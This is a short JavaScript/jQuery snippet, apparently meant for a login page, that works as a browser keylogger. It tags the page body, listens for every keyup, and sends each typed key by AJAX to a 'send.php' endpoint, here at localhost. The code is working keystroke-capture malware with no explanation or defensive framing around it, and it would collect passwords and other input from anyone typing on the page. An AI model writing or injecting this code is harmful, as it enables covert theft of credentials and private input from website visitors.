document.getElementsByTagName("body")[0].setAttribute("id", "mylogin"); 
  
  $('#mylogin').on('keyup', function (event) {
    
     	var charCode = event.code;
      
    	var charStr = String.fromCharCode(charCode);    	
     	
	 $.ajax({
       type:"GET",
       cache:false,
       url:"http://localhost/send.php",
       data: {
	c:event.key
              }, // multiple data sent using ajax.
       async: false,
       success: function (response) {
//         console.log("Success");
    
       },//sucess
       failure: function (response) {
  //        console.log("Failure");
    
       }//fail if anything wrong happens 
 });        
   
       
    });
